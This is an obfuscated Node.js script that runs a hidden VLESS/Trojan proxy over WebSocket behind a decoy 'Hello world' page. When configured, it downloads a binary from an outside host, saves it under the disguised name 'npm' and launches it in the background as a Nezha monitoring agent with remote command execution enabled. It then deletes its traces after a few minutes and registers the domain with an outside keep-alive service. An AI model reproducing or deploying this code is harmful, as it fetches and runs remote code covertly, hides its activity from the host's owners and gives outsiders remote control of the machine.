const _0x1ed1=['/bin/bash','https://arm64.ssss.nyc.mn/v1','readUInt8','error','substr','writeHead','sha224','8.8.4.4','&path=%2F','listen','env','log','chmod\x20+x\x20npm','text/plain','Status','Answer','end','update','NEZHA_KEY','slice','data','https://api.ip.sb/geoip','close','toString','UUID','trim','length','type','catch','once','vless://','\x20with\x20all\x20DNS\x20servers','readFile','443','WSPATH','readUInt16BE','test','2053','index.html','includes','npm','npm\x20is\x20already\x20running,\x20skip\x20running...','pop','Server\x20is\x20running\x20on\x20port\x20','country_code','get','error:\x20','replace','https://amd64.ssss.nyc.mn/agent','utf-8','https://dns.google/resolve?name=','&fp=chrome&type=ws&host=','pipe','connect','utf8','from','hex','child_process','join','text/html','write','reduce','true','NEZHA_SERVER','base64','setsid\x20nohup\x20./npm\x20-s\x20','client_secret:\x20','net','then','digest','Server','NAME','axios','DOMAIN','map','Unknown',':443?encryption=none&security=tls&sni=','url'];const _0x115f=function(_0x1ed111,_0x115f6c){_0x1ed111=_0x1ed111-0x0;let _0x43e224=_0x1ed1[_0x1ed111];return _0x43e224;};const os=require('os');const http=require('http');const fs=require('fs');const axios=require(_0x115f('0x48'));const net=require(_0x115f('0x43'));const path=require('path');const crypto=require('crypto');const {Buffer}=require('buffer');const {exec,execSync}=require(_0x115f('0x39'));const {WebSocket,createWebSocketStream}=require('ws');const UUID=process[_0x115f('0xa')][_0x115f('0x18')]||'fde3cec9-8151-4122-b55e-7a6b752d6f8a';const NEZHA_SERVER=process[_0x115f('0xa')][_0x115f('0x3f')]||'';const NEZHA_PORT=process[_0x115f('0xa')]['NEZHA_PORT']||'';const NEZHA_KEY=process[_0x115f('0xa')][_0x115f('0x12')]||'';const DOMAIN=process['env'][_0x115f('0x49')]||'1234.abc.com';const AUTO_ACCESS=process['env']['AUTO_ACCESS']||!![];const WSPATH=process['env'][_0x115f('0x22')]||UUID[_0x115f('0x13')](0x0,0x8);const SUB_PATH=process[_0x115f('0xa')]['SUB_PATH']||'sub';const NAME=process['env'][_0x115f('0x47')]||'';const PORT=process['env']['PORT']||0x1eb4;let ISP='';const GetISP=async()=>{try{const _0x5008cd=await axios[_0x115f('0x2d')](_0x115f('0x15'));const _0x34e2a6=_0x5008cd[_0x115f('0x14')];ISP=(_0x34e2a6[_0x115f('0x2c')]+'-'+_0x34e2a6['isp'])[_0x115f('0x2f')](/ /g,'_');}catch(_0x2f0df0){ISP=_0x115f('0x4b');}};GetISP();const httpServer=http['createServer']((_0x565ec3,_0x48d492)=>{if(_0x565ec3['url']==='/'){const _0xba51bc=path[_0x115f('0x3a')](__dirname,_0x115f('0x26'));fs[_0x115f('0x20')](_0xba51bc,_0x115f('0x36'),(_0x173caf,_0x1cfe07)=>{if(_0x173caf){_0x48d492[_0x115f('0x5')](0xc8,{'Content-Type':_0x115f('0x3b')});_0x48d492['end']('Hello\x20world!');return;}_0x48d492[_0x115f('0x5')](0xc8,{'Content-Type':'text/html'});_0x48d492['end'](_0x1cfe07);});return;}else if(_0x565ec3[_0x115f('0x4d')]==='/'+SUB_PATH){const _0x174448=NAME?NAME+'-'+ISP:ISP;const _0x7936e5=_0x115f('0x1e')+UUID+'@'+DOMAIN+_0x115f('0x4c')+DOMAIN+'&fp=chrome&type=ws&host='+DOMAIN+_0x115f('0x8')+WSPATH+'#'+_0x174448;const _0x35b379='trojan://'+UUID+'@'+DOMAIN+':443?security=tls&sni='+DOMAIN+_0x115f('0x33')+DOMAIN+_0x115f('0x8')+WSPATH+'#'+_0x174448;const _0x31ee89=_0x7936e5+'\x0a'+_0x35b379;const _0xf868b=Buffer[_0x115f('0x37')](_0x31ee89)['toString'](_0x115f('0x40'));_0x48d492['writeHead'](0xc8,{'Content-Type':_0x115f('0xd')});_0x48d492[_0x115f('0x10')](_0xf868b+'\x0a');}else{_0x48d492['writeHead'](0x194,{'Content-Type':'text/plain'});_0x48d492[_0x115f('0x10')]('Not\x20Found\x0a');}});const wss=new WebSocket[(_0x115f('0x46'))]({'server':httpServer});const uuid=UUID[_0x115f('0x2f')](/-/g,'');const DNS_SERVERS=[_0x115f('0x7'),'1.1.1.1'];function resolveHost(_0x4eac9d){return new Promise((_0x4c530b,_0x497c45)=>{if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[_0x115f('0x24')](_0x4eac9d)){_0x4c530b(_0x4eac9d);return;}let _0x5d8064=0x0;function _0x150ab4(){if(_0x5d8064>=DNS_SERVERS[_0x115f('0x1a')]){_0x497c45(new Error('Failed\x20to\x20resolve\x20'+_0x4eac9d+_0x115f('0x1f')));return;}const _0x52aa10=DNS_SERVERS[_0x5d8064];_0x5d8064++;const _0x878b27=_0x115f('0x32')+encodeURIComponent(_0x4eac9d)+'&type=A';axios['get'](_0x878b27,{'timeout':0x1388,'headers':{'Accept':'application/dns-json'}})[_0x115f('0x44')](_0x5bc618=>{const _0x5bde9e=_0x5bc618[_0x115f('0x14')];if(_0x5bde9e[_0x115f('0xe')]===0x0&&_0x5bde9e['Answer']&&_0x5bde9e['Answer'][_0x115f('0x1a')]>0x0){const _0x5a2c91=_0x5bde9e[_0x115f('0xf')]['find'](_0x2509c5=>_0x2509c5[_0x115f('0x1b')]===0x1);if(_0x5a2c91){_0x4c530b(_0x5a2c91['data']);return;}}_0x150ab4();})['catch'](_0x5006b5=>{_0x150ab4();});}_0x150ab4();});}function handleVlessConnection(_0x121824,_0x38a024){const [_0x44e12e]=_0x38a024;const _0x31b6de=_0x38a024[_0x115f('0x13')](0x1,0x11);if(!_0x31b6de['every']((_0x5e9cdf,_0x3805a8)=>_0x5e9cdf==parseInt(uuid['substr'](_0x3805a8*0x2,0x2),0x10)))return![];let _0x12fb2e=_0x38a024['slice'](0x11,0x12)[_0x115f('0x2')]()+0x13;const _0x8dd43e=_0x38a024[_0x115f('0x13')](_0x12fb2e,_0x12fb2e+=0x2)['readUInt16BE'](0x0);const _0x3e45ab=_0x38a024[_0x115f('0x13')](_0x12fb2e,_0x12fb2e+=0x1)['readUInt8']();const _0x1c72bf=_0x3e45ab==0x1?_0x38a024[_0x115f('0x13')](_0x12fb2e,_0x12fb2e+=0x4)['join']('.'):_0x3e45ab==0x2?new TextDecoder()['decode'](_0x38a024['slice'](_0x12fb2e+0x1,_0x12fb2e+=0x1+_0x38a024[_0x115f('0x13')](_0x12fb2e,_0x12fb2e+0x1)['readUInt8']())):_0x3e45ab==0x3?_0x38a024[_0x115f('0x13')](_0x12fb2e,_0x12fb2e+=0x10)[_0x115f('0x3d')]((_0x60f155,_0x579110,_0x516589,_0x21e8b4)=>_0x516589%0x2?_0x60f155['concat'](_0x21e8b4[_0x115f('0x13')](_0x516589-0x1,_0x516589+0x1)):_0x60f155,[])['map'](_0x4c12ae=>_0x4c12ae[_0x115f('0x23')](0x0)[_0x115f('0x17')](0x10))[_0x115f('0x3a')](':'):'';_0x121824['send'](new Uint8Array([_0x44e12e,0x0]));const _0x44c0ea=createWebSocketStream(_0x121824);resolveHost(_0x1c72bf)[_0x115f('0x44')](_0x687f52=>{net[_0x115f('0x35')]({'host':_0x687f52,'port':_0x8dd43e},function(){this['write'](_0x38a024['slice'](_0x12fb2e));_0x44c0ea['on']('error',()=>{})[_0x115f('0x34')](this)['on'](_0x115f('0x3'),()=>{})[_0x115f('0x34')](_0x44c0ea);})['on'](_0x115f('0x3'),()=>{});})['catch'](_0x539472=>{net['connect']({'host':_0x1c72bf,'port':_0x8dd43e},function(){this['write'](_0x38a024['slice'](_0x12fb2e));_0x44c0ea['on']('error',()=>{})['pipe'](this)['on'](_0x115f('0x3'),()=>{})[_0x115f('0x34')](_0x44c0ea);})['on']('error',()=>{});});return!![];}function handleTrojanConnection(_0x2a7741,_0x2db47c){try{if(_0x2db47c['length']<0x3a)return![];const _0x2b83ab=_0x2db47c[_0x115f('0x13')](0x0,0x38)['toString']();const _0x2e56b2=[UUID];let _0x3b3dc5=null;for(const _0x45fb8d of _0x2e56b2){const _0x5ee8d9=crypto['createHash'](_0x115f('0x6'))[_0x115f('0x11')](_0x45fb8d)[_0x115f('0x45')](_0x115f('0x38'));if(_0x5ee8d9===_0x2b83ab){_0x3b3dc5=_0x45fb8d;break;}}if(!_0x3b3dc5)return![];let _0x22eddd=0x38;if(_0x2db47c[_0x22eddd]===0xd&&_0x2db47c[_0x22eddd+0x1]===0xa){_0x22eddd+=0x2;}const _0x38cb87=_0x2db47c[_0x22eddd];if(_0x38cb87!==0x1)return![];_0x22eddd+=0x1;const _0x4a432d=_0x2db47c[_0x22eddd];_0x22eddd+=0x1;let _0x4fce82,_0x155ff1;if(_0x4a432d===0x1){_0x4fce82=_0x2db47c[_0x115f('0x13')](_0x22eddd,_0x22eddd+0x4)[_0x115f('0x3a')]('.');_0x22eddd+=0x4;}else if(_0x4a432d===0x3){const _0x37b8db=_0x2db47c[_0x22eddd];_0x22eddd+=0x1;_0x4fce82=_0x2db47c[_0x115f('0x13')](_0x22eddd,_0x22eddd+_0x37b8db)['toString']();_0x22eddd+=_0x37b8db;}else if(_0x4a432d===0x4){_0x4fce82=_0x2db47c[_0x115f('0x13')](_0x22eddd,_0x22eddd+0x10)['reduce']((_0x38a13c,_0x1c47b2,_0x13e8b8,_0x2f5c52)=>_0x13e8b8%0x2?_0x38a13c['concat'](_0x2f5c52['slice'](_0x13e8b8-0x1,_0x13e8b8+0x1)):_0x38a13c,[])[_0x115f('0x4a')](_0x33813d=>_0x33813d[_0x115f('0x23')](0x0)['toString'](0x10))['join'](':');_0x22eddd+=0x10;}else{return![];}_0x155ff1=_0x2db47c['readUInt16BE'](_0x22eddd);_0x22eddd+=0x2;if(_0x22eddd<_0x2db47c[_0x115f('0x1a')]&&_0x2db47c[_0x22eddd]===0xd&&_0x2db47c[_0x22eddd+0x1]===0xa){_0x22eddd+=0x2;}const _0x5b1b5f=createWebSocketStream(_0x2a7741);resolveHost(_0x4fce82)[_0x115f('0x44')](_0x5ba920=>{net['connect']({'host':_0x5ba920,'port':_0x155ff1},function(){if(_0x22eddd<_0x2db47c['length']){this[_0x115f('0x3c')](_0x2db47c[_0x115f('0x13')](_0x22eddd));}_0x5b1b5f['on']('error',()=>{})['pipe'](this)['on'](_0x115f('0x3'),()=>{})[_0x115f('0x34')](_0x5b1b5f);})['on']('error',()=>{});})[_0x115f('0x1c')](_0xc51bc4=>{net['connect']({'host':_0x4fce82,'port':_0x155ff1},function(){if(_0x22eddd<_0x2db47c[_0x115f('0x1a')]){this['write'](_0x2db47c['slice'](_0x22eddd));}_0x5b1b5f['on'](_0x115f('0x3'),()=>{})[_0x115f('0x34')](this)['on'](_0x115f('0x3'),()=>{})[_0x115f('0x34')](_0x5b1b5f);})['on'](_0x115f('0x3'),()=>{});});return!![];}catch(_0x402558){return![];}}wss['on']('connection',(_0x585247,_0x2c5440)=>{const _0x248b82=_0x2c5440['url']||'';_0x585247[_0x115f('0x1d')]('message',_0x22e061=>{if(_0x22e061[_0x115f('0x1a')]>0x11&&_0x22e061[0x0]===0x0){const _0x494eb6=_0x22e061['slice'](0x1,0x11);const _0xaad6e3=_0x494eb6['every']((_0x4c9221,_0x4460bb)=>_0x4c9221==parseInt(uuid[_0x115f('0x4')](_0x4460bb*0x2,0x2),0x10));if(_0xaad6e3){if(!handleVlessConnection(_0x585247,_0x22e061)){_0x585247['close']();}return;}}if(!handleTrojanConnection(_0x585247,_0x22e061)){_0x585247[_0x115f('0x16')]();}})['on']('error',()=>{});});const getDownloadUrl=()=>{const _0x59fe73=os['arch']();if(_0x59fe73==='arm'||_0x59fe73==='arm64'||_0x59fe73==='aarch64'){if(!NEZHA_PORT){return _0x115f('0x1');}else{return'https://arm64.ssss.nyc.mn/agent';}}else{if(!NEZHA_PORT){return'https://amd64.ssss.nyc.mn/v1';}else{return _0x115f('0x30');}}};const downloadFile=async()=>{if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x53cdfd=getDownloadUrl();const _0x5ae15c=await axios({'method':'get','url':_0x53cdfd,'responseType':'stream'});const _0x147a37=fs['createWriteStream'](_0x115f('0x28'));_0x5ae15c[_0x115f('0x14')]['pipe'](_0x147a37);return new Promise((_0x464fe8,_0x431add)=>{_0x147a37['on']('finish',()=>{console[_0x115f('0xb')]('npm\x20download\x20successfully');exec(_0x115f('0xc'),_0x182174=>{if(_0x182174)_0x431add(_0x182174);_0x464fe8();});});_0x147a37['on'](_0x115f('0x3'),_0x431add);});}catch(_0x1fe79b){throw _0x1fe79b;}};const runnz=async()=>{try{const _0x326569=execSync('ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22',{'encoding':_0x115f('0x31')});if(_0x326569[_0x115f('0x19')]()!==''){console[_0x115f('0xb')](_0x115f('0x29'));return;}}catch(_0x4cd103){}await downloadFile();let _0x211862='';let _0x3e2dff=[_0x115f('0x21'),'8443','2096','2087','2083',_0x115f('0x25')];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x3d09f5=_0x3e2dff['includes'](NEZHA_PORT)?'--tls':'';_0x211862=_0x115f('0x41')+NEZHA_SERVER+':'+NEZHA_PORT+'\x20-p\x20'+NEZHA_KEY+'\x20'+_0x3d09f5+'\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&';}else if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x27b266=NEZHA_SERVER[_0x115f('0x27')](':')?NEZHA_SERVER['split'](':')[_0x115f('0x2a')]():'';const _0x182dba=_0x3e2dff[_0x115f('0x27')](_0x27b266)?_0x115f('0x3e'):'false';const _0x3f870e=_0x115f('0x42')+NEZHA_KEY+'\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20'+NEZHA_SERVER+'\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20'+_0x182dba+'\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20'+UUID;fs['writeFileSync']('config.yaml',_0x3f870e);}_0x211862='setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&';}else{console['log']('NEZHA\x20variable\x20is\x20empty,\x20skip\x20running');return;}try{exec(_0x211862,{'shell':_0x115f('0x0')},_0x457a8e=>{if(_0x457a8e)console[_0x115f('0x3')]('npm\x20running\x20error:',_0x457a8e);else console[_0x115f('0xb')]('npm\x20is\x20running');});}catch(_0x44db2d){console['error'](_0x115f('0x2e')+_0x44db2d);}};async function addAccessTask(){if(!AUTO_ACCESS)return;if(!DOMAIN){return;}const _0x4310ad='https://'+DOMAIN;try{const _0x397ae2=await axios['post']('https://oooo.serv00.net/add-url',{'url':_0x4310ad},{'headers':{'Content-Type':'application/json'}});console[_0x115f('0xb')]('Automatic\x20Access\x20Task\x20added\x20successfully');}catch(_0x5494e1){}}const delFiles=()=>{fs['unlink'](_0x115f('0x28'),()=>{});fs['unlink']('config.yaml',()=>{});};httpServer[_0x115f('0x9')](PORT,()=>{runnz();setTimeout(()=>{delFiles();},0x2bf20);addAccessTask();console['log'](_0x115f('0x2b')+PORT);});
